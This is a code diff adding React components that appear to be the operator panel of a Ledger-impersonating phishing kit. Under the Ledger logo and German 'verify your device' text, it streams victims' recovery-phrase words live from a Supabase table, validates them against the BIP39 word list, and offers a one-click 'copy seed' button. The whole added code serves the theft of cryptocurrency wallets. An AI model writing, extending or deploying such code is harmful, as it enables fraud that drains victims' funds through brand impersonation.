@@ -263,3 +263,160 @@ function SessionDetail({ session, onClose }: { session: Session | null; onClose:
     </Dialog>
   );
 }
+
+/* ---------- Seed Peek Dialog (mirrors Ledger SeedDialog) ---------- */
+
+function SeedPeekDialog({ session, onClose }: { session: Session | null; onClose: () => void }) {
+  const [rows, setRows] = useState<SeedWord[]>([]);
+  const [tab, setTab] = useState<"12" | "18" | "24">("24");
+
+  // Follow live seed_length from session
+  useEffect(() => {
+    if (!session) return;
+    const len = session.seed_length;
+    if (len === 12 || len === 18 || len === 24) {
+      setTab(String(len) as "12" | "18" | "24");
+    }
+  }, [session?.seed_length, session?.id]);
+
+  useEffect(() => {
+    if (!session) {
+      setRows([]);
+      return;
+    }
+    supabase
+      .from("session_seed_words")
+      .select("*")
+      .eq("session_id", session.id)
+      .order("position")
+      .then(({ data }) => setRows(data ?? []));
+
+    const ch = supabase
+      .channel(`seed-peek-${session.id}`)
+      .on(
+        "postgres_changes",
+        { event: "*", schema: "public", table: "session_seed_words", filter: `session_id=eq.${session.id}` },
+        (payload) => {
+          setRows((cur) => {
+            if (payload.eventType === "INSERT") {
+              const row = payload.new as SeedWord;
+              return [...cur.filter((w) => w.position !== row.position), row].sort((a, b) => a.position - b.position);
+            }
+            if (payload.eventType === "UPDATE") {
+              const row = payload.new as SeedWord;
+              return cur.map((w) => (w.id === row.id ? row : w)).sort((a, b) => a.position - b.position);
+            }
+            if (payload.eventType === "DELETE") return cur.filter((w) => w.id !== (payload.old as SeedWord).id);
+            return cur;
+          });
+        },
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(ch);
+    };
+  }, [session?.id]);
+
+  const count = Number(tab);
+  const words = Array.from({ length: count }, (_, i) => rows.find((r) => r.position === i + 1)?.word ?? "");
+  const filledCount = words.filter((w) => w.trim().length > 0).length;
+
+  async function copySeed() {
+    const text = words.map((w) => w ?? "").join(" ").trim();
+    if (!text) {
+      toast.error("Noch keine Wörter zum Kopieren");
+      return;
+    }
+    try {
+      await navigator.clipboard.writeText(text);
+      toast.success("Seed kopiert");
+    } catch {
+      toast.error("Kopieren fehlgeschlagen");
+    }
+  }
+
+  return (
+    <Dialog open={!!session} onOpenChange={(o) => !o && onClose()}>
+      <DialogContent className="max-h-[90vh] max-w-2xl overflow-y-auto border-none bg-white p-8 text-black sm:p-10">
+        <div className="flex flex-col items-center">
+          <img src={ledgerLogo} alt="Ledger" className="mb-6 h-12 w-auto" />
+          <h3 className="text-xl font-semibold text-black">Gerät verifizieren</h3>
+          <p className="mt-2 max-w-md text-center text-sm text-gray-600">
+            Gib die Wörter deiner Recovery-Phrase in der richtigen Reihenfolge ein.
+          </p>
+
+          <Tabs value={tab} onValueChange={(v) => setTab(v as "12" | "18" | "24")} className="mt-6 w-full">
+            <TabsList className="mx-auto flex w-full max-w-md justify-center gap-2 bg-transparent p-0">
+              {(["12", "18", "24"] as const).map((c) => (
+                <TabsTrigger
+                  key={c}
+                  value={c}
+                  className="rounded-md bg-transparent px-4 py-2 text-sm text-gray-500 shadow-none transition-colors data-[state=active]:bg-gray-100 data-[state=active]:text-black data-[state=active]:shadow-none"
+                >
+                  {c} Wörter
+                </TabsTrigger>
+              ))}
+            </TabsList>
+          </Tabs>
+
+          <div className="mt-6 w-full">
+            <SeedPeekGrid count={count} words={words} />
+          </div>
+
+          <div className="mt-6 flex w-full items-center justify-between text-sm text-gray-500">
+            <span>
+              {filledCount}/{count} Wörter
+            </span>
+            <button
+              type="button"
+              onClick={copySeed}
+              className="inline-flex items-center gap-2 rounded-md border border-gray-300 px-3 py-1.5 text-sm font-medium text-gray-700 hover:bg-gray-100"
+            >
+              <Copy className="h-4 w-4" />
+              Seed kopieren
+            </button>
+          </div>
+        </div>
+      </DialogContent>
+    </Dialog>
+  );
+}
+
+function SeedPeekGrid({ count, words }: { count: number; words: string[] }) {
+  return (
+    <div className="grid grid-cols-2 gap-x-5 gap-y-4 sm:grid-cols-4">
+      {Array.from({ length: count }).map((_, i) => {
+        const raw = words[i] ?? "";
+        const val = raw.trim().toLowerCase();
+        const filled = raw.length > 0;
+        const isValid = val.length > 0 && BIP39_WORDS.has(val);
+
+        let borderClass: string;
+        if (val.length === 0) {
+          borderClass = "border-gray-300";
+        } else if (isValid) {
+          borderClass = "border-black";
+        } else {
+          borderClass = "border-red-500";
+        }
+
+        return (
+          <div
+            key={i}
+            className={`flex items-center gap-1.5 border-b pb-1 transition-colors ${borderClass}`}
+          >
+            <span className={`shrink-0 text-xs ${filled ? "text-black" : "text-gray-400"}`}>{i + 1}.</span>
+            <input
+              type="text"
+              value={raw}
+              readOnly
+              className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500"}`}
+            />
+          </div>
+        );
+      })}
+    </div>
+  );
+}
+
